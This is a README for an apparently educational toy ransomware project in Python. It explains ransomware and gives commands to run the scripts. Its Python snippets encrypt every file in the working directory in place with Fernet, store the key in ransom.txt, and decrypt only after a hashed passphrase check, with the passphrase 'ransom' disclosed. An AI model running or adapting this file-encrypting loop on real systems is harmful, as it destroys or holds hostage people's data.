# Simple Ransomware in Python
[![Python Version](https://img.shields.io/badge/python-3.x-brightgreen.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

## What is Ransomware?

Ransomware is a type of malicious software (malware) that encrypts a user's files or locks them out of their system, rendering the data inaccessible until a ransom is paid. It typically spreads through phishing emails, malicious links, or software vulnerabilities. Once activated, ransomware will encrypt files and demand payment, often in cryptocurrency, to provide the decryption key.

## Purpose of This Project

This project, **Simple Ransomware in Python**, is designed for educational purposes only. It demonstrates how ransomware attacks function and the mechanisms behind file encryption and decryption. Understanding these concepts is crucial for cybersecurity awareness and defense strategies.

### Warning: 
**DO NOT use these scripts on any real or sensitive data.** This code is for educational purposes only and should only be run in a controlled environment, such as a virtual machine or a sandbox, where it cannot cause harm. Misuse of this code could result in data loss or legal consequences.

## Features

- **File Encryption**: Encrypts all files in the directory (except specified scripts) using symmetric encryption (Fernet).
- **Decryption**: Allows the user to decrypt files if the correct secret key is provided.
- **GUI Notifications**: Uses `tkinter` to display messages during encryption and decryption processes.

## Files Included

- `ransomware.py`: The main script that encrypts files.
- `Decrypt.py`: The script that decrypts the encrypted files.
- `ransom.txt`: A text file containing the encryption key.
  
## How It Works

### Encryption Process:
1. The script scans the current directory for files to encrypt.
2. It generates a symmetric encryption key using the `Fernet` encryption algorithm from the `cryptography` library.
3. The encryption key is stored in the `ransom.txt` file.
4. All files except the script files (`ransomware.py`, `Decrypt.py`, and `ransom.txt`) are encrypted.
5. The contents of the selected files are replaced with their encrypted versions.
6. A message is printed to the console, and a GUI notification warns the user that their files have been encrypted.

#### Code Snippet (Encryption):
```python
 key = Fernet.generate_key()
 with open("ransom.txt", "wb") as thekey:
     thekey.write(key)

 for file in files:
     contents = open(file, "rb").read()
     encrypted_contents = Fernet(key).encrypt(contents)
     open(file, "wb").write(encrypted_contents)
```

### Decryption Process:
1. The `Decrypt.py` script prompts the user to input a secret phrase.
2. The phrase is hashed using `SHA-256` and compared to a predefined secret hash and the secret key for this attack is **ransom**.
3. If the phrase is correct, the script retrieves the encryption key from the `ransom.txt` file.
4. The encrypted files are decrypted and restored to their original state.
5. A success message is printed, and the user is notified via a GUI popup.
6. If the secret phrase is incorrect, the decryption fails, and a warning message is displayed.

   
#### Code Snippet (Decryption):
```python
if hashlib.sha256(user_input.encode()).hexdigest() == secret_hash:
    for file in files:
        decrypted_contents = Fernet(secretkey).decrypt(open(file, "rb").read())
        open(file, "wb").write(decrypted_contents)
```



## Requirements

To run this project, you need the following:

- Python 3.x
- `cryptography` library (install via pip):
  ```bash
  pip install cryptography
  ```
- `tkinter` for GUI notifications (usually included with Python installations).

## How to Run
1. Clone or download the repository.
2. Navigate to the project directory.
3. Run the encryption script:
   ```bash
   python3 ransomware.py
   ```
     - this will encrypt all the files in the Project directory.
  
4. To decrypt, use:
   ```bash
   python3 Decrypt.py
   ```
     - this will decrypt all the files in the Project directory.

## Conclusion
This project serves as a learning tool to understand the mechanics of ransomware. It highlights the importance of cybersecurity practices, such as regular backups and secure file handling. Always remember to keep your systems updated and be cautious of suspicious links and attachments.

**Disclaimer** : The author is not responsible for any misuse or damage caused by the use of this code. Use at your own risk.


  






  
  
